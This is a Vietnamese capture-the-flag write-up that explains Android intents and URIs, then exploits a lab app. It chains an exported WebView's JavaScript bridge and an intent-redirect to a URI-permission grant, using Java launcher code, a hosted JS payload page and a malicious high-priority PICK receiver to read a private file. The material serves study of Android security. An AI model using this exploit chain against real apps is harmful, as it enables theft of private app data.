## Link tham khảo
Trước khi đi đến chi tiết bài viết đầu tiên ta cần tìm hiểu intent trong lập trình android là gì và khi đứng ở một activity thì nó điều khiển một activity khác cũng như khi đứng ở một app này gọi app khác như nào tại các link sau:
 - [Tài liệu về Intent từ trang web.](https://developer.android.com/guide/components/intents-filters.html)
 - [Tìm hiểu Intent tiếng Việt xem từ bài 7.](https://www.youtube.com/watch?v=u2dUCLFzHkI&list=PL6aoXCbsHwIayYCo9aDuzZ3dMC9oShs1u&index=14)
 - [Webview trong Android.](https://www.youtube.com/watch?v=3jZ4dMeJR1A)

Khi đã hiểu được cơ bản xem tiếp về cách thức tấn công [tại đây.
](https://blog.oversecured.com/Android-Access-to-app-protected-components/)

## Sơ lược về những khái niệm cơ bản

- **Intent** có thể hiểu nó như một message object và có thể sử dụng nó để yêu cầu một action từ một component của một app khác hoặc sử dụng nó để yêu cầu một activity khác từ app đó hoặc app khác. Có thể thấy được từ docs đã mô tả rất rõ về điều đó cũng như activity và Intent nó sẽ có gì
![image](https://hackmd.io/_uploads/Bkij0Z8m1e.png)

- Có 2 loại intent đó là `Explicit intents` và `Implicit intents` tất cả đều có trong docs.
![image](https://hackmd.io/_uploads/B1uykzIXkg.png)

- Theo như tài liệu viết `Explicit intents` thường dùng để gọi trong chính app. Còn `Implicit intents` thường dùng để gọi app khác. Nhưng nhìn về một mặt khác, nếu như đã biết được `ComponentName` của app khác và app đó có mở chế độ `export` thì hoàn toàn có thể đứng từ app này gọi activity app khác.

- Cấu trúc `intent` (nguồn [tại đây](https://viblo.asia/p/xu-ly-android-intent-voi-google-chrome-cho-android-63vKjke6Z2R))
```
intent:
   HOST/URI-path // Tùy thể tùy chỉnh theo ý thích
   #Intent;
      package=[string]; // Cần phải có để định danh ứng dụng cần mở
      action=[string]; // Tùy thể tùy chỉnh theo ý thích
      category=[string]; // Tùy thể tùy chỉnh theo ý thích
      component=[string]; // Tùy thể tùy chỉnh theo ý thích
      scheme=[string]; // Tùy thể tùy chỉnh theo ý thích
   end;
```

- Tiếp theo về **URI (Uniform Resource Identifier)**. Khi nói về URI nói chung thì nó được hiểu như định danh tài nguyên đồng nhất. Cụ thể URI được sử dụng để chỉ ra một tài nguyên hoặc đối tượng trong hệ thống hoặc trên mạng. Cụ thể hơn, URI trong Android thường được dùng để xác định vị trí của các tài nguyên như hình ảnh, âm thanh, tệp tin hoặc thậm chí là các đối tượng trong cơ sở dữ liệu của ứng dụng. URI thường có dạng:
    - Scheme: 
        - `content://` -  truy cập data qua Content Provider.
        - `file://` - truy cập file trong thiết bị.
        - `http://`,  `https://` - truy cập web
        - `tel://:` -  số điện thoại.
        - ...
    - Authority: là nội dung sau scheme
    - Ví dụ: `https://www.example.com:8080` thì scheme là `https://` còn authority là `www.example.com:8080`
- Sự khác nhau giữa `setData` và `putExtra` [tại đây.](https://stackoverflow.com/questions/18794504/intent-setdata-vs-intent-putextra)

## Cách hoạt động của intent (tự mình đúc kết qua quá trình tìm hiểu)

Câu hỏi được đặt ra để mình viết phần này đó là tại sao có thể chạy được activity khác ?? Nó chạy thông qua đâu ??

### Explicit Intent

Một intent triển khai dưới dạng explicit sẽ giống như sau: 
```java
        Intent testIntent = new Intent();
        testIntent.setClassName("packageName", "ClassName");
        testIntent.putExtra("text", "Okoonzzz/Rocev");
        startActivity(testIntent);
```
Hoặc như sau:
```java
intent://pathHostOrURIhere#Intent;scheme=typeScheme;component=ComponentName/.ClassNanme;end
```
=> Nhìn chung tất cả đều mang đúng cấu trúc của một Intent. Khi mà đưa intent vào startActivity lúc này nó sẽ chạy activity đã được định sẵn trong intent (componentName và className) sau đó truyền những data thích hợp vào activity cũng đã được định sẵn trong intent (URI,...).

### Implicit Intent

Một intent được triển khai dưới dạng implicit sẽ có dạng như sau:
```java
Intent intent = new Intent(Your_Action_Name_In_IntentFilter);
intent.setData(Uri.parse("https://google.com"));
startActivity(intent);
```
Khi sử dụng kiểu như này đòi hỏi phải có mục `intent-filters` trong `AndroidManifest.xml` giống như này
![image](https://hackmd.io/_uploads/BkqGKGL71g.png)
Thì lúc này khi intent được gửi vào startActivity thì `android system` sẽ tìm kiếm tất cả các app có intent filter sao cho match với intent đã định nghĩa sau đó sẽ chạy component có intent-filter đó và truyền Intent vào component vừa chạy. Nên muốn chạy một activity cụ thể nào phải để name intent filter đó là duy nhất và filter phải rõ ràng. Trong trường hợp có nhiều name như thế thì system sẽ đưa ra cho user lựa chọn chạy app nào.

## WU cách tấn công

### Kiểm tra source code

Đầu tiên ta sẽ xem qua `AndroidManifest.xml` của file như sau
![image](https://hackmd.io/_uploads/HybI-7U7yg.png)
Có thể thấy được có 3 activity đó là `MainActivity`, `PickerActivity` và `WebviewActivity`. Đi sâu vào từng activity ta thu được nhưng dữ kiện sau:
-    Với `MainActivity` và `WebviewActivity` không có gì đặc biệt ngoại trừ đều cho phép export, tức là có thể gọi từ app khác.
-    Với `PickerActivity` thông số `exported` được set là false, tức là app khác sẽ không truy cập vào được component này mà chỉ có chính app này mới có thể gọi component này. Tiếp đến `grantUriPermissions` được set là true, tức là tại đây có thể cấp quyền cho URI. Cuối cùng file path được định nghĩa tại `provider_paths.xml`
    ![image](https://hackmd.io/_uploads/SJyUM7IX1g.png)

Tiến hành xem cụ thể từng activity. Đầu tiên với `MainActivity` ta có được như sau:
![image](https://hackmd.io/_uploads/B1zer7UXye.png)
Nhìn qua đoạn code, chương trình đang sử dụng khá nhiều explicit intent để giao tiếp giữa `MainActivity` và `WebviewActivity`. Cụ thể sau khi lấy được đường dẫn của file `flaggo.txt` thì chương trình có 3 button. Lần lượt 3 putton này yêu cầu webview load 3 url. Nhưng có vẻ android mình simulate chỉ load được duy nhất 1 link ở button 3 còn 2 link ở button 2 và 1 không load được có thể do là link medium.

Tiếp theo đến `WebviewActivity` ta sẽ thấy được như sau:
![image](https://hackmd.io/_uploads/Bk08UQLXJg.png)

Ở đây, `WebviewActivity` sử dụng `@JavascriptInterface
` (phần này làm gì mình đã refer link video ở đầu bài viết) và ở đây có 2 method `showToast` và `accessDeeplink`.
-    Với `showToast` dùng để pop up message ở dưới android
-    Với `accessDeeplink` để truy cập vào url tại android app từ javascript ở webview.

Bên dưới `onCreate` sau khi `addJavascriptInterface`  với name `netsight` thì lấy intent và load url từ intent vừa get được.

> Phần webview này mình cũng đã code thử và thành công sẽ quay video hoặc up code emulate sau ^^

Cuối cùng `PickerActivity`
![image](https://hackmd.io/_uploads/H1j0umIQkg.png)

Ở đây, dễ dàng bắt gặp được PickerActivity đang triển khai implicit intents với name là `android.intent.action.PICK`. Sau đó setData vào intent với nội dung là nội dung nhận được từ một intent khác. Sau đó set flag cho intent là 1, tương ứng với `FLAG_GRANT_READ_URI_PERMISSION`, có thể tìm hiểu thêm flag intent [tại đây](https://developer.android.com/reference/android/content/Intent#setFlags(int)). Cuối cùng là startActivityForResult tức là gửi intent đi và đợi kết quả từ activity đó, đi kèm với code request là `0`.

### Phân tích và tìm cách

Công việc chính bây giờ là phải đọc được file được lưu tại `data/data/com.tcpip.netsight/files/bmw.txt` vì bài này chưa có file flag nên mình đã push một file `.txt` vào và thay đổi quyền cũng như owner phù hợp với chall. Vậy để đọc được file từ một app khác nếu đọc như bình thường bằng cách truy cập vào và đọc ngay tại URI đó là không thể. Bởi nếu không phải `su` thì những app ngoài không có quyền đọc những data được lưu tại `data/data/com.name_app/files`. 

Vậy để có thể đọc được phải đòi hỏi đọc từ app gốc. Nhưng ở app gốc không thấy đoạn code nào là in ra nội dung file, đoạn code chỉ có mỗi lấy path tại file `.txt`. Do đó bây giờ phải tạo một app khác, app này có nhiệm vụ trigger được component trong app gốc và hiển thị nội dung của file `.txt`. 

Để hiện thực hóa vấn đề đó một app khác lợi dụng những component được set true ở export. Cụ thể trong bài này là `WebviewActivity`. Sau đó lúc này tuy trigger được `WebviewActivity` nhưng vẫn chưa đọc flag được vì `WebviewActivity` chỉ parse URI và gửi intent đến một activity khác. Vì không có đoạn nào là đọc flag từ app gốc nên chuyển sang đọc flag bằng app khác, nhưng để đọc được từ app khác cần phải có quyền để có thể đọc được. Để ý kỹ lại `PickerActivity` **có đoạn code set quyền đọc cho intent**. Do đó từ `WebviewActivity` lợi dụng `startActivity` để gửi intent tới `PickerActivity`. Lúc này intent sẽ có quyền đọc. Sau khi URI có quyền đọc (tức là app khác có quyền đọc URI đó và thực hiện query URI) thì công việc còn lại của app khác đó là chỉ cần nhận intent đã được cập quyền và mở URI và đọc.

### Hiện thực hóa

Đầu tiên cần tạo được intent thỏa mãn các điều kiện như đã phân tích. Intent đó bao gồm host phải được gửi từ `Content Provider`, phần URI sẽ là đường dẫn tới file `.txt`. Và phải set quyền cho URI nên component sẽ là `PickerActivity`. Đây là đoạn code thực hiện (xem kết quả trả về ở logcat).

```java
Intent testIntent = new Intent();
testIntent.setClassName("com.tcpip.netsight","com.tcpip.netsight.PickerActivity");
testIntent.setData(Uri.parse("content://com.tcpip.netsight.FileProvider/bmw.txt"));
Log.d("View Uri", testIntent.toUri(Intent.URI_INTENT_SCHEME));
```
![image](https://hackmd.io/_uploads/Hk6QUnI7kl.png)

Sau khi có được intent như ý muốn, tiến hành host trang web, trang web này có chức năng gọi java code đoạn script  sẽ như sau:

```htmlembedded
<h1>
  Chall 2 Rocev
</h1>

<script type="text/javascript">
  function ShowToast(toast){
    netsight.showToast(toast);
  }
  
  function accessToDeeplink(link){
    netsight.accessDeeplink(link);
  }
  accessToDeeplink("intent://com.tcpip.netsight.FileProvider/bmw.txt#Intent;scheme=content;component=com.tcpip.netsight/.PickerActivity;end");
  
</script>
```
Host xong quay lại app thực hiện trigger vào `WebviewActivity` của app gốc

```java
Intent testIntent = new Intent();
testIntent.setClassName("com.tcpip.netsight", "com.tcpip.netsight.WebviewActivity");
testIntent.putExtra("url", "https://everlasting-sideways-melody.glitch.me");
startActivity(testIntent);
```
Khi `startActivity` ở app vừa tạo thì `WebviewActivity` của app gốc sẽ được trigger, sau khi `getIntent` và `loadUrl` thành công, lúc này `accessDeeplink` trong `WebviewActivity` của app gốc sẽ được gọi vì đoạn js gọi `accessToDeeplink` mà hàm này lại gọi `accessDeeplink` trong java code. Khi được gọi vì đã tạo sẵn component gửi tiếp theo là `PickerActivity` nên `accessDeeplink` sẽ trigger được `PickerActivity`. Khi `PickerActivity` được gọi nó sẽ set quyền cho intent và tiếp tục gửi intent vừa nhận đến một app khác với intent filter là `android.intent.action.PICK`. 



Vậy công việc cuối cùng ở app vừa tạo tạo thêm một activity để nhận intent này.

```java
public class PickerFake extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_picker_fake);
        Log.d("plt", "i'm here");
        Toast.makeText(getApplicationContext(), "hereeeeeee", Toast.LENGTH_LONG).show();

        Intent data = getIntent();

        if(data!= null && (data.getFlags() & Intent.FLAG_GRANT_READ_URI_PERMISSION) != 0){
            Uri uri = data.getData();

            ContentResolver contentResolver = getContentResolver();

            Log.d("My URI", uri.toString());
            Log.d("My resol", contentResolver.toString());

            if(uri!= null){
                InputStream inputStream = null;
                try {
                    inputStream = getContentResolver().openInputStream(uri);
                } catch (FileNotFoundException e) {
                    throw new RuntimeException(e);
                }
                try {
                    TextView textView = findViewById((R.id.textView2));
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                    StringBuilder stringBuilder = new StringBuilder();
                    String line;
                    while ((line = bufferedReader.readLine()) != null){
                        stringBuilder.append(line);
                    }
                    textView.setText(stringBuilder.toString());
                    inputStream.close();
                } catch (FileNotFoundException e) {
                    throw new RuntimeException(e);
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }

            }

        }

    }
}
```

Để chạy thành công phải sửa lại `AndroidManifest.xml` như sau (đoạn này mình đã nhờ gpt fix hộ cũng không hiểu sao nó lại sai lúc code :Vv )

```java
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

    <uses-permission android:name="android.permission.INTERNET" />

    <application
        android:allowBackup="true"
        android:dataExtractionRules="@xml/data_extraction_rules"
        android:fullBackupContent="@xml/backup_rules"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.MyApplication"
        android:usesCleartextTraffic="true"
        tools:targetApi="31">

        <activity
            android:name="com.example.myapplication.MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <activity
            android:name="com.example.myapplication.PickerFake"
            android:exported="true">
            <intent-filter android:priority="99999999">
                <action android:name="android.intent.action.PICK" />
                <data android:scheme="content" />
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
        </activity>

    </application>

</manifest>
```
